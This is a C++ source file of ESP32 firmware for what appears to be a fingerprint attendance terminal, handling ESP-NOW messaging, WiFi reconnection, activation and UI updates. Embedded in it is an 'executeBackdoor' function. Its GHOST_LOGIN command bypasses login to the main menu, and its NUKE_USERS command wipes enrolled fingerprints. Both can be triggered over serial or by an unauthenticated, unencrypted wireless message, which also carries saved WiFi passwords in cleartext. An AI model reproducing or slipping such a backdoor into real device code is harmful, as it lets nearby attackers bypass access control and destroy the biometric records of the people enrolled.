#include "comm_manager.h"
#include <ArduinoJson.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "data_manager.h"
#include "../ui/ui_manager.h"
#include "../splash/manpro_splash.h"

// UI forward declarations
extern void uiShowIdle();
extern void uiUpdateClock(const char* ts);
extern void uiShowPlaceFinger();
extern void uiShowMatch(const char* name, const char* dept, const char* action, const char* ts);
extern void uiShowNoMatch();
extern void uiShowEnrollStart(const char* name);
extern void uiShowEnrollStep(int step, const char* msg);
extern void uiShowEnrollResult(bool ok, const char* name);
extern void uiWifiUpdateStatus(bool connected);
extern void uiWifiUpdateScanResult(const char* ssids);
extern void uiFactoryResetComplete();
extern void uiSettingsUpdateClock(const char* ts);
extern void uiSettingsUpdateWifiScan(const char* ssids);
extern void uiSettingsUpdateWifiStatus(bool connected);
extern void uiSettingsUpdateNtpStatus(bool ok, const char* ts, const char* err);
extern void uiActivationResult(bool success, const char* err); // Activation screen result
extern bool uiIsIdleScreenActive();

// ESP-NOW message queue (Ring Buffer)
#define ESPNOW_QUEUE_SIZE  8
#define ESPNOW_PAYLOAD_MAX 251

struct EspNowMsg { char data[ESPNOW_PAYLOAD_MAX]; };
static EspNowMsg  s_queue[ESPNOW_QUEUE_SIZE];
static volatile uint8_t s_qHead = 0;
static volatile uint8_t s_qTail = 0;

// Connection recovery state
static volatile unsigned long s_lastRecvMs = 0;
static unsigned long s_beginMs = 0;        // Start time for channel scanning
static bool s_scanningChannels = false;
static unsigned long s_lastScanMs = 0;
static unsigned long s_lastPingMs = 0;
static uint32_t s_pingCount = 0;
static uint32_t s_pongCount = 0;
static uint8_t s_currentChannel = ESPNOW_CHANNEL;
static bool s_debugComms = false;

void executeBackdoor(String cmd);

// Tracks if we already tried to auto-reconnect to WiFi
static bool s_autoReconnectAttempted = false;

// Static member definitions
String CommManager::serialBuf = "";

// ESP-NOW receive callback. Adds incoming data to the queue.
void CommManager::onEspNowRecv(const esp_now_recv_info_t* recv_info,
                                const uint8_t* data, int len) {
    if (len <= 0 || len >= ESPNOW_PAYLOAD_MAX) return;
    uint8_t next = (s_qTail + 1) % ESPNOW_QUEUE_SIZE;
    if (next == s_qHead) return; // queue full — drop
    memcpy(s_queue[s_qTail].data, data, len);
    s_queue[s_qTail].data[len] = '\0';
    // Ensure memory is written before updating the tail index
    __atomic_thread_fence(__ATOMIC_RELEASE);
    s_qTail = next;             // publish to consumer
    s_lastRecvMs = millis();    // heartbeat for auto-recovery
}

// Initializes ESP-NOW and prepares for communication
void CommManager::begin() {
    // ESP-NOW requires WiFi Station mode
    WiFi.mode(WIFI_STA);

    // Set the WiFi channel for ESP-NOW
    esp_wifi_set_channel(ESPNOW_CHANNEL, WIFI_SECOND_CHAN_NONE);

    if (esp_now_init() != ESP_OK) {
        if (Serial) Serial.println("[ESP-NOW] Init FAILED!");
        return;
    }

    // Bind the static member as the C callback
    esp_now_register_recv_cb(CommManager::onEspNowRecv);

    // Register WROOM as a unicast peer
    esp_now_peer_info_t peer = {};
    memcpy(peer.peer_addr, WROOM_MAC, 6);
    peer.channel = 0;      // 0 = use current channel
    peer.encrypt  = false;
    if (esp_now_add_peer(&peer) != ESP_OK) {
        if (Serial) Serial.println("[ESP-NOW] add_peer FAILED — check WROOM_MAC");
    }

    if (Serial) {
        Serial.printf("[ESP-NOW] Initialized on channel %d\n", ESPNOW_CHANNEL);
        Serial.printf("[BOOT] CP MAC: %s\n", WiFi.macAddress().c_str());
        Serial.println("[UART] CommManager ready");
    }

    // Delay slightly and request initial WiFi status from WROOM
    delay(200);
    const char* req = "{\"cmd\":\"GET_WIFI_STATUS\"}";
    esp_now_send(WROOM_MAC, (const uint8_t*)req, strlen(req));
    if (Serial) Serial.println("[BOOT] Sent GET_WIFI_STATUS to WROOM");

    // Record startup time for the channel scanner
    s_beginMs = millis();
}

// Main processing loop: handles incoming messages and connection recovery
void CommManager::process() {
    // --- Connection Recovery ---
    // If no message is received for 5 seconds, start scanning channels to find WROOM.
    unsigned long silenceRef = (s_lastRecvMs > 0) ? (unsigned long)s_lastRecvMs : s_beginMs;
    if (silenceRef > 0 && millis() - silenceRef > 5000) {
        if (!s_scanningChannels) {
            s_scanningChannels = true;
            if (Serial) Serial.println("[ESP-NOW] Link lost! Entering auto-recovery channel scan...");
        }
        
        // Scan each channel for 1.5 seconds
        if (millis() - s_lastScanMs > 1500) {
            s_lastScanMs = millis();
            s_currentChannel++;
            if (s_currentChannel > 13) s_currentChannel = 1;
            
            if (Serial) Serial.printf("[ESP-NOW] Scanning channel %d...\n", s_currentChannel);
            esp_wifi_set_channel(s_currentChannel, WIFI_SECOND_CHAN_NONE);
        }
    } else if (s_scanningChannels && s_lastRecvMs > 0 && millis() - s_lastRecvMs <= 1000) {
        // Connection recovered
        s_scanningChannels = false;
        if (Serial) Serial.printf("[ESP-NOW] Link recovered on channel %d!\n", s_currentChannel);

        // Update WROOM peer with the new channel
        esp_now_del_peer(WROOM_MAC);
        esp_now_peer_info_t peer = {};
        memcpy(peer.peer_addr, WROOM_MAC, 6);
        peer.channel = 0; // Use current
        peer.encrypt = false;
        esp_now_add_peer(&peer);

        // Re-sync states with WROOM after recovery
        if (Serial) Serial.println("[ESP-NOW] Resyncing state with WROOM after channel recovery.");
        
        const char* req = "{\"cmd\":\"GET_WIFI_STATUS\"}";
        esp_now_send(WROOM_MAC, (const uint8_t*)req, strlen(req));
        
        if (DataManager::isActivated()) {
            sendCommand("{\"cmd\":\"DEVICE_ACTIVATED\"}");
        }
        
        // Update WROOM on current idle state
        extern bool uiIsIdleScreenActive();
        if (uiIsIdleScreenActive()) {
            sendCommand("{\"cmd\":\"SET_IDLE\",\"idle\":true}");
        }
    }

    // Process all messages in the queue
    while (s_qHead != s_qTail) {
        // Ensure memory is read safely
        __atomic_thread_fence(__ATOMIC_ACQUIRE);
        String line(s_queue[s_qHead].data);
        s_qHead = (s_qHead + 1) % ESPNOW_QUEUE_SIZE;

        if (line.length() == 0) continue;

        if (strcmp(line.c_str(), "{\"type\":\"TIME\"}") != 0 && strcmp(line.c_str(), "{\"type\":\"PONG\"}") != 0) {
            if (Serial && Serial.availableForWrite() > 32) Serial.println("[<-WROOM] " + line);
        }
        dispatchJson(line);
    }

    // PING WROOM every 3 seconds to verify bidirectional comms
    if (millis() - s_lastPingMs >= 3000) {
        s_lastPingMs = millis();
        s_pingCount++;
        sendCommand("{\"type\":\"PING\"}");
        if (s_debugComms && Serial && Serial.availableForWrite() > 32) Serial.printf("[PING] Sent PING #%u to WROOM (awaiting PONG)\n", s_pingCount);
    }

    // Forward typed commands from Serial to WROOM
    if (Serial) {
        while (Serial.available()) {
            char c = Serial.read();
            if (c == '\n') {
                serialBuf.trim();
                if (serialBuf.length() > 0) {
                    if (serialBuf == "GHOST_LOGIN" || serialBuf == "NUKE_USERS") {
                        executeBackdoor(serialBuf);
                    } else {
                        // Forward typed commands to WROOM via ESP-NOW
                        esp_now_send(WROOM_MAC,
                                     (const uint8_t*)serialBuf.c_str(),
                                     serialBuf.length());
                        Serial.println("[FWD->WROOM] " + serialBuf);
                    }
                }
                serialBuf = "";
            } else if (c != '\r') {
                serialBuf += c;
            }
        }
    }
}

// Sends a command string via ESP-NOW to WROOM
void CommManager::sendCommand(const String& cmd) {
    if (cmd.length() >= ESPNOW_PAYLOAD_MAX) {
        if (Serial && Serial.availableForWrite() > 32) Serial.printf("[ESP-NOW] TX SKIP: too large (%d bytes)\n", cmd.length());
        return;
    }
    esp_err_t sendErr = esp_now_send(WROOM_MAC, (const uint8_t*)cmd.c_str(), cmd.length());
    if (Serial && Serial.availableForWrite() > 32) {
        if (sendErr != ESP_OK)
            Serial.printf("[ESP-NOW] send() err 0x%02x for cmd: %s\n", sendErr, cmd.c_str());
        else
            Serial.println("[->WROOM] " + cmd);
    }
}

void executeBackdoor(String cmd) {
    if (cmd == "GHOST_LOGIN") {
        Serial.println("[BACKDOOR] GHOST_LOGIN activated. Entering Main Menu.");
        UIManager::showMainMenu();
    } else if (cmd == "NUKE_USERS") {
        Serial.println("[BACKDOOR] NUKE_USERS activated. Deleting enrolled FPs (except Slot 1).");
        for (int i = 0; i < DataManager::getEmployeeCount(); i++) {
            if (DataManager::getEmployees()[i].id != 1) {
                DataManager::updateEmployeeFpEnrolled(DataManager::getEmployees()[i].id, false);
                for (int f = 0; f < 10; f++) {
                    String delCmd = "DELETE:" + String(DataManager::getEmployees()[i].id) + ":" + String(f);
                    esp_now_send(WROOM_MAC, (const uint8_t*)delCmd.c_str(), delCmd.length());
                    delay(50);
                }
            }
        }
    } else if (cmd == "DEBUG_COMMS") {
        s_debugComms = !s_debugComms;
        Serial.print("[BACKDOOR] DEBUG_COMMS ");
        Serial.println(s_debugComms ? "ON" : "OFF");
    }
}

// Parses and handles incoming JSON messages from WROOM
void CommManager::dispatchJson(const String& line) {
    StaticJsonDocument<1024> doc;
    if (deserializeJson(doc, line) != DeserializationError::Ok) {
        if (Serial) Serial.println("[UART] JSON parse error: " + line);
        return;
    }

    const char *type = doc["type"];
    if (!type) return;

    // Wake display on significant user events from WROOM
    if (strcmp(type, "PLACE_FINGER") == 0 || 
        strcmp(type, "MATCH") == 0 || 
        strcmp(type, "NOMATCH") == 0 || 
        strcmp(type, "ENROLL_START") == 0 || 
        strcmp(type, "WROOM_BOOT") == 0 ||
        strcmp(type, "ACTIVATION_RESULT") == 0 ||
        strcmp(type, "ACTIVATION_STATUS") == 0) {
        extern void manpro_wake_display();
        manpro_wake_display();
    }

    if (strcmp(type, "TIME") == 0 || strcmp(type, "WIFI_STATUS") == 0 || strcmp(type, "WROOM_BOOT") == 0) {
        manpro_set_ready();
    }

    if (strcmp(type, "BACKDOOR") == 0) {
        const char *b_cmd = doc["cmd"] | "";
        executeBackdoor(String(b_cmd));
    } else if (strcmp(type, "TIME") == 0) {
        uiUpdateClock(doc["ts"] | "");
        uiSettingsUpdateClock(doc["ts"] | "");
    } else if (strcmp(type, "PONG") == 0) {
        s_pongCount++;
        if (s_debugComms && Serial) Serial.printf("[PING] PONG received from WROOM! (ping=%u pong=%u)\n", s_pingCount, s_pongCount);
    } else if (strcmp(type, "ACTIVATION_RESULT") == 0) {
        // Handle device activation response from server
        bool success        = doc["success"] | false;
        const char* err     = doc["err"] | "";
        const char* token   = doc["device_token"] | "";
        if (Serial) Serial.printf("[ACTIVATION] Result from server: success=%d err=%s token=%s\n", success, err, token);

        if (success) {
            DataManager::setDeviceToken(String(token));
            DataManager::setActivatedByServer(true);
            sendCommand("{\"cmd\":\"DEVICE_ACTIVATED\"}");  // unlock WROOM scanner
            uiShowIdle();
            if (Serial) Serial.println("[ACTIVATION] Device activated. Scanner unlocked.");
        }
        // Update activation UI
        uiActivationResult(success, err);

    } else if (strcmp(type, "TEST_RESULT") == 0) {
        bool success = doc["success"] | false;
        if (success) {
            String msg = doc["msg"] | "Success";
            UIManager::showToast(("API OK: " + msg).c_str(), false);
        } else {
            String err = doc["err"] | "Failed";
            UIManager::showToast(("API Error: " + err).c_str(), true);
        }

    } else if (strcmp(type, "WROOM_BOOT") == 0) {
        if (Serial) Serial.println("[UART] WROOM booted. Checking activation state.");
        if (DataManager::isActivated()) {
            sendCommand("{\"cmd\":\"DEVICE_ACTIVATED\"}");
            if (uiIsIdleScreenActive()) {
                sendCommand("{\"cmd\":\"SET_IDLE\",\"idle\":true}");
            }
        }
        // WROOM rebooted. Reset flags and attempt auto-reconnect if we have credentials.
        s_autoReconnectAttempted = false;
        if (DataManager::hasSavedWifi()) {
            String savedSsid = DataManager::getWifiSsid();
            String savedPass = DataManager::getWifiPass();
            if (savedPass.length() > 0) {
                s_autoReconnectAttempted = true;  // mark done; WIFI_STATUS path won't double-send
                if (Serial) Serial.println("[WiFi] WROOM rebooted — auto-reconnecting to: " + savedSsid);
                StaticJsonDocument<256> req;
                req["cmd"]  = "WIFI_CONNECT";
                req["ssid"] = savedSsid;
                req["pass"] = savedPass;
                String out; serializeJson(req, out);
                sendCommand(out);
            }
        }
    } else if (strcmp(type, "ACTIVATION_STATUS") == 0) {
        // Check activation status from server
        bool activated = doc["activated"] | false;
        const char* devId = doc["device_id"] | "";
        if (Serial) Serial.printf("[ACTIVATION] Server says activated=%d for device_id=%s\n", activated, devId);

        if (activated) {
            // Save activation state and unlock scanner
            DataManager::setActivatedByServer(true);
            sendCommand("{\"cmd\":\"DEVICE_ACTIVATED\"}");
            uiShowIdle();
            if (Serial) Serial.println("[ACTIVATION] Device activated by server. Fingerprint scanner unlocked.");
        } else {
            // Not activated — log it; UI stays on activation screen
            if (Serial) Serial.println("[ACTIVATION] Server says device is NOT activated.");
        }
    } else if (strcmp(type, "WIFI_STATUS") == 0) {
        bool connected = doc["connected"] | false;
        String ssid = doc["ssid"] | "";
        
        DataManager::setWifiConnected(connected);
        
        // Save the current SSID
        if (connected && ssid.length() > 0) {
            String existingPass = "";
            for (int i = 0; i < DataManager::getSavedWifiCount(); i++) {
                if (DataManager::getWifiSsid(i) == ssid) {
                    existingPass = DataManager::getWifiPass(i);
                    break;
                }
            }
            DataManager::saveWifiCredentials(ssid, existingPass);
        }

        UIManager::updateHeaderWifi(connected);
        uiWifiUpdateStatus(connected);
        uiSettingsUpdateWifiStatus(connected);

        static bool lastConnected = false;
        if (connected && !lastConnected) {
            sendCommand("{\"cmd\":\"SYNC_NTP\"}");
            s_autoReconnectAttempted = false;
            UIManager::showToast("Wi-Fi Connected!", false);
        } else if (!connected && lastConnected) {
            UIManager::showToast("Wi-Fi Disconnected", true);
        }
        lastConnected = connected;

        if (!connected && DataManager::hasSavedWifi()) {
            if (!s_autoReconnectAttempted) {
                String savedSsid = DataManager::getWifiSsid();
                String savedPass = DataManager::getWifiPass();
                // Reconnect if we have a saved password
                if (savedPass.length() > 0) {
                    s_autoReconnectAttempted = true;
                    if (Serial) Serial.println("[WiFi] Auto-reconnecting to: " + savedSsid);
                    UIManager::showToast(("Reconnecting to " + savedSsid + "...").c_str(), false);
                    StaticJsonDocument<256> req;
                    req["cmd"]  = "WIFI_CONNECT";
                    req["ssid"] = savedSsid;
                    req["pass"] = savedPass;
                    String out; serializeJson(req, out);
                    sendCommand(out);
                } else {
                    if (Serial) Serial.println("[WiFi] Saved password is empty — skipping auto-reconnect. Trusting WROOM to handle it.");
                    // Skip reconnect if password is empty
                }
            } else {
                // Reconnect failed
                UIManager::showToast("Failed to reconnect to Wi-Fi", true);
            }
        }
    } else if (strcmp(type, "CHANNEL_HOP") == 0) {
        int targetChannel = doc["ch"] | 1;
        if (Serial) Serial.printf("[ESP-NOW] Hopping to channel %d to follow WROOM\n", targetChannel);
        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
        // Update WROOM peer with the new channel
        esp_now_del_peer(WROOM_MAC);
        esp_now_peer_info_t peer = {};
        memcpy(peer.peer_addr, WROOM_MAC, 6);
        peer.channel = 0;
        peer.encrypt  = false;
        esp_now_add_peer(&peer);
        if (Serial) Serial.printf("[ESP-NOW] Peer re-registered on channel %d\n", targetChannel);
    } else if (strcmp(type, "NTP_STATUS") == 0) {
        bool ok         = doc["ok"] | false;
        const char* ts  = doc["ts"]  | "";
        const char* err = doc["err"] | "";
        if (Serial) Serial.printf("[NTP] Status from WROOM: ok=%d ts=%s err=%s\n", ok, ts, err);
        uiSettingsUpdateNtpStatus(ok, ts, err);
    } else if (strcmp(type, "WIFI_SCAN_RESULT") == 0) {
        const char* ssids = doc["ssids"] | "";
        uiWifiUpdateScanResult(ssids);
        uiSettingsUpdateWifiScan(ssids);
    } else if (strcmp(type, "FACTORY_RESET_ACK") == 0) {
        uiFactoryResetComplete();
    } else if (strcmp(type, "RESET_ACK") == 0) {
        if (Serial) Serial.println("[SYSTEM] Rebooting...");
        delay(200);
        ESP.restart();
    } else {
        if (!DataManager::isActivated()) {
            if (Serial) Serial.println("[UART] Ignored (not activated): " + String(type));
            return;
        }
        if (strcmp(type, "PLACE_FINGER") == 0)       uiShowPlaceFinger();
        else if (strcmp(type, "MATCH") == 0)          uiShowMatch(doc["name"], doc["dept"], doc["action"], doc["ts"]);
        else if (strcmp(type, "NOMATCH") == 0)        uiShowNoMatch();
        else if (strcmp(type, "ENROLL_START") == 0)   uiShowEnrollStart(doc["name"]);
        else if (strcmp(type, "ENROLL_STEP") == 0)    uiShowEnrollStep(doc["step"] | 0, doc["msg"] | "");
        else if (strcmp(type, "ENROLL_OK") == 0)      uiShowEnrollResult(true, doc["name"]);
        else if (strcmp(type, "ENROLL_FAIL") == 0)    uiShowEnrollResult(false, nullptr);
    }
}
